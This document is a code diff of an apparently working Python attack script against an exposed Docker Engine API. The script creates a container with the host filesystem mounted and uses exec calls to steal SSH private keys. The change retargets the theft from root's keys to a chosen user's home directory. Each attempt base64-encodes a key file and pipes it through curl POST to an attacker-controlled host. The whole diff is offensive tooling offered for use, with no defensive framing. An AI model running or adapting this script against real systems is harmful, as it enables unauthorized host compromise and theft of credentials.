@@ -3,22 +3,17 @@ import json
 import time
 
 # === CONFIG ===
-target = "http://x.X.x.X:xxx"
+target = "http://x.X.x.X:xxxx"
 image = "<YOUR IMAGE>"
 attacker_host = "http://x.X.x.X:8000"
+username = "<PICK A USER>"
 container_cmd = "while true; do sleep 1; done"
 
-# SSH key targets
-ssh_targets = [
-    "/host/root/.ssh/id_rsa",
-    "/host/root/.ssh/id_ecdsa",
-    "/host/root/.ssh/id_ed25519",
-    "/host/root/.ssh/authorized_keys"
-]
+home = f"/host/home/{username}/.ssh"
+key_files = ["id_rsa", "id_ecdsa", "id_ed25519"]
 
-# Function to run a command inside the container
 def exec_command(container_id, command):
-    print(f"[*] Creating exec for: {command}")
+    print(f"[*] Exec: {command}")
     exec_payload = {
         "AttachStdout": True,
         "AttachStderr": True,
@@ -28,7 +23,7 @@ def exec_command(container_id, command):
     exec_id = r.json().get("Id")
     if not exec_id:
         print("[-] Failed to create exec")
-        return False
+        return None
     r = requests.post(f"{target}/exec/{exec_id}/start", json={"Detach": False, "Tty": False})
     return r.status_code == 200
 
@@ -57,19 +52,17 @@ if r.status_code not in [204, 200]:
     print("[-] Failed to start container:", r.text)
     exit(1)
 print("[+] Container running")
-
-# Step 3: Give it a moment
 time.sleep(2)
 
-# Step 4: Attempt SSH key exfiltration
-for path in ssh_targets:
-    fname = path.split("/")[-1]
-    exfil_cmd = f"base64 {path} | curl -X POST -d @- {attacker_host}/ssh/{fname}"
-    print(f"[*] Trying to exfil: {path}")
-    if exec_command(container_id, exfil_cmd):
-        print(f"[+] Exfil triggered for: {path}")
+# Step 3: Try each SSH key
+for key in key_files:
+    ssh_path = f"{home}/{key}"
+    post_path = f"{username}_{key}"
+    exfil_cmd = f"base64 {ssh_path} | curl -X POST -d @- {attacker_host}/ssh/{post_path}"
+    print(f"[*] Trying to exfil: {ssh_path}")
+    result = exec_command(container_id, exfil_cmd)
+    if result:
+        print(f"[+] Exfil triggered for: {ssh_path}")
         break
     else:
-        print(f"[!] Failed to read: {path}")
-else:
-    print("[-] All SSH key exfil attempts failed.")
+        print(f"[!] Failed to exfil: {ssh_path}")
